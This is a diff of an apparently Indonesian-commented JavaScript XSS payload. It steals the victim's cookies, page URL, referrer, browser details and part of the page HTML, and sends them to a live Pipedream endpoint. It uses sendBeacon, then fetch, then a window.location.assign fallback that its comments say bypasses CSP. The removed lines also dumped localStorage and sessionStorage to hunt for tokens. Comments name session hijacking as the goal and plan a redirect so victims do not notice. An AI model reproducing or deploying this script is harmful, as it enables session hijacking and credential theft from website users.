@@ -1,63 +1,50 @@
 (function () {
-  // Config: Ganti URL ini dengan URL Pipedream kamu
+  // Config: Pastikan Pipedream sudah diset RETURN 302 (Redirect Back)
   const ENDPOINT = "https://eozpb8qg2g763of.m.pipedream.net"; 
 
   try {
     const data = {
-      // Informasi Environment
       url: location.href,
-      cookie: document.cookie, // Target utama (Session Hijacking)
+      cookie: document.cookie, 
       referrer: document.referrer,
       userAgent: navigator.userAgent,
       platform: navigator.platform,
-      
-      // Fingerprinting Tingkat Lanjut
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      screen: {
-        width: screen.width,
-        height: screen.height
-      },
-      
-      // Storage Dump (Mencari JWT/API Keys tersembunyi)
-      localStorage: JSON.stringify(localStorage),
-      sessionStorage: JSON.stringify(sessionStorage),
-      
-      // DOM Snapshot (Untuk melihat konteks halaman korban)
-      html: document.documentElement.outerHTML.slice(0, 1000), // Ambil 1000 char pertama
-      
-      // Metadata
-      ts: new Date().toISOString(),
-      id: Math.random().toString(36).substring(2)
+      // Kita kurangi size HTML biar URL tidak terlalu panjang & error
+      html: document.documentElement.outerHTML.slice(0, 500), 
+      ts: new Date().toISOString()
     };
 
-    // --- METODE PENGIRIMAN (Stealth & Robust) ---
+    // Encode payload ke Base64 agar aman di URL & tidak merusak struktur query
+    const encodedPayload = btoa(JSON.stringify(data));
+    // Tambahkan random string untuk mematikan cache browser
+    const exfilUrl = `${ENDPOINT}/?data=${encodedPayload}&_=${Math.random()}`;
 
-    // 1. Coba kirim pakai Beacon (Lebih reliable saat tab ditutup, sangat stealth)
-    // Navigator.sendBeacon mengirim POST request secara asynchronous
+    // --- METODE PENGIRIMAN ---
+
+    // 1. Silent Attempt (Beacon)
     const blob = new Blob([JSON.stringify(data)], {type : 'application/json'});
     const sent = navigator.sendBeacon(ENDPOINT, blob);
 
-    // 2. Jika Beacon gagal atau browser tua, gunakan Fetch
+    // 2. Jika Beacon gagal, coba Fetch dengan kredensial omit (Anti-CORS)
     if (!sent) {
         fetch(ENDPOINT, {
             method: "POST",
+            credentials: "omit", 
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
         }).catch(() => {
-            // 3. NUCLEAR FALLBACK: Image GET (Bypass CSP connect-src)
-            // Jika fetch diblokir firewall/CSP, kita paksa lewat tag Gambar
-            // Note: Data html/storage mungkin terpotong karena batas panjang URL
-            const queryParams = new URLSearchParams({
-                id: data.id,
-                url: data.url,
-                cookie: data.cookie
-            }).toString();
+            // 3. NUCLEAR FALLBACK: Location Assign (CSP Bypass)
+            // Masuk sini berarti 'connect-src' diblokir CSP.
+            // Kita paksa browser pindah halaman. Karena ini navigasi, 
+            // CSP tidak bisa memblokirnya.
             
-            new Image().src = `${ENDPOINT}/?${queryParams}`;
+            // NOTE: Agar "Silent", pastikan Pipedream me-redirect user 
+            // kembali ke halaman asal (Referrer) atau Login Page.
+            window.location.assign(exfilUrl);
         });
     }
 
   } catch (e) {
-    // Silent fail agar tidak ketahuan di console log korban
+    // Fail silently
   }
 })();
